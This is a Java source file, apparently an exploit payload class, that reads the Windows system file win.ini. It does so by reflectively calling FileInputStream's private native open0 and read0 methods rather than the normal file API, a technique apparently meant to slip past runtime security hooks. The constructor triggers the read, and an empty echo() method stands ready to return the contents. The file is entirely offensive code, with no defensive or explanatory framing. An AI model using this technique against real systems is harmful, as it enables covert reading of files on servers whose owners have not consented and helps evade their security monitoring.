package top.racerz.Exploit;

import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class FileRead {
    private String result;

    public FileRead() throws Exception {
        try {
            String path = "C:\\Windows\\win.ini";
            FileInputStream proxyFos = new FileInputStream(path);
            // fd = new FileDescriptor();
            Class<?> clazz = Class.forName("java.io.FileInputStream");
            Field field = clazz.getDeclaredField("fd");
            field.setAccessible(true);
            field.set(proxyFos, new FileDescriptor());

            // fd.attach(this);
            Class<?> fd = Class.forName("java.io.FileDescriptor");
            Method fd_method = fd.getDeclaredMethod("attach", Closeable.class);
            fd_method.setAccessible(true);
            fd_method.invoke(proxyFos.getFD(), proxyFos);

            // open0(name);
            Method m = clazz.getDeclaredMethod("open0", String.class);
            m.setAccessible(true);
            m.invoke(proxyFos, path);

            // read0();
            Method m2 = clazz.getDeclaredMethod("read0");
            m2.setAccessible(true);

            ByteArrayOutputStream out = new ByteArrayOutputStream();

            int tempbyte;
            while ((tempbyte = (Integer)m2.invoke(proxyFos)) != -1) {
                out.write(tempbyte);
            }
            this.result = out.toString();

            // close();
            Method m3 = clazz.getDeclaredMethod("close");
            m3.setAccessible(true);
            m3.invoke(proxyFos);

        } catch (Exception e) {
            this.result = "文件读取出错！";
        }

        this.echo();
    }

    public void echo() throws Exception {

    }

    public static void main(String[] args) throws Exception {
        FileRead fileRead = new FileRead();
    }
}
